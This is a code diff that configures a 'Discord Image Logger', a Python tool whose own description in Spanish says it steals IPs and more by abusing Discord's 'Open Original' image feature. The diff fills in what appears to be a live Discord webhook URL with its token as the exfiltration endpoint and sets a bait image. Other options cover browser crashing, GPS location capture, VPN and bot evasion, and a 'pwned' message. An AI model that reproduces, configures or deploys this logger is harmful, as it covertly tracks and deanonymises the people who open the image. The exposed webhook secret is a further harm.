@@ -2,17 +2,17 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "Una aplicación sencilla que te permite robar IP y más abusando de la función Open Original de Discord"
-__version__ = "v2.0"
-__author__ = "Fran"
+#__app__ = "Discord Image Logger"
+#__description__ = "Una app sencilla que te permite robar IP y mas abusando de la funcion Open Original de Discord"
+#__version__ = "v2.0"
+#__author__ = "Fran"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK-AQUI",
-    "image": "LINK-IMAGG-AQUI", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1430756772603236416/_QorivAwZKEOVk6alCXiZPLHo_PiPC1MIj9xzl30zomTzQdDaXK9mBIipJvaagphCN1H",
+    "image": "https://media.discordapp.net/attachments/1430756751061549117/1430756937678721085/Captura_desde_2025-10-10_00-35-06.png?ex=68faefbc&is=68f99e3c&hm=ec26f2cafbfae939712a60671d2d305361c875431f5c299c2b57220c1b446256&=&format=webp&quality=lossless&width=978&height=930", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Le permite utilizar un argumento de URL para cambiar la imagen (VER EL README)
+    "imageArgument": False, # Le permite utilizar un argumento de URL para cambiar la imagen (VER EL README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Establezca esto con el nombre que desea que tenga el webhook
@@ -21,10 +21,10 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Intenta bloquear/congelar el navegador del usuario, es posible que no funcione.
     
-    "accurateLocation": False, # Utiliza GPS para encontrar la ubicación exacta de los usuarios (dirección real, etc.) deshabilitado porque pregunta al usuario lo cual puede ser sospechoso.
+    "accurateLocation": False, # Utiliza GPS para encontrar la ubicacion exacta de los usuarios (direccion real, etc.) deshabilitado porque pregunta al usuario lo cual puede ser sospechoso.
 
     "message": { # Mostrar un mensaje personalizado cuando el usuario abre la imagen
-        "doMessage": False, # ¿Habilitar el mensaje personalizado?
+        "doMessage": False, # Habilitar el mensaje personalizado?
         "message": "This browser has been pwned by Fran Image Logger.", # Mensaje
         "richMessage": True, 
     },
@@ -34,8 +34,8 @@ config = {
                     # 1 = No hacer ping cuando se sospecha de una VPN
                     # 2 = No enviar una alerta cuando se sospecha de una VPN
 
-    "linkAlerts": True, # Alerta cuando alguien envía el enlace (puede que no funcione si el enlace se envía varias veces con unos pocos minutos de diferencia)
-    "buggedImage": True, # Muestra una imagen de carga como vista previa cuando se envía en Discord (puede aparecer como una imagen de color aleatorio en algunos dispositivos)
+    "linkAlerts": True, # Alerta cuando alguien envia el enlace (puede que no funcione si el enlace se envia varias veces con unos pocos minutos de diferencia)
+    "buggedImage": True, # Muestra una imagen de carga como vista previa cuando se envia en Discord (puede aparecer como una imagen de color aleatorio en algunos dispositivos)
 
     "antiBot": 1, # Evita que los bots activen la alerta
                   # 0 = Sin anti-bot
@@ -47,16 +47,16 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # ¿Redirigir a una página web?
+        "redirect": False, # Redirigir a una pagina web?
         "page": "https://your-link.here" # Link
     },
 
-    # Por favor, introduzca todos los valores en el formato correcto. De lo contrario, podría fallar.
-    # No edite nada debajo de esto, a menos que sepa lo que está haciendo.
-    # NOTA: La jerarquía es la siguiente:
-    # 1) Redirección (Si está activada, desactiva la imagen y bloquea el navegador)
-    # 2) Bloqueo del navegador (Si está activada, desactiva la imagen)
-    # 3) Mensaje (Si está activada, desactiva la imagen)
+    # Por favor, introduzca todos los valores en el formato correcto. De lo contrario, podria fallar.
+    # No edite nada debajo de esto, a menos que sepa lo que esta haciendo.
+    # NOTA: La jerarquia es la siguiente:
+    # 1) Redireccion (Si esta activada, desactiva la imagen y bloquea el navegador)
+    # 2) Bloqueo del navegador (Si esta activada, desactiva la imagen)
+    # 3) Mensaje (Si esta activada, desactiva la imagen)
     # 4) Imagen
 }
 
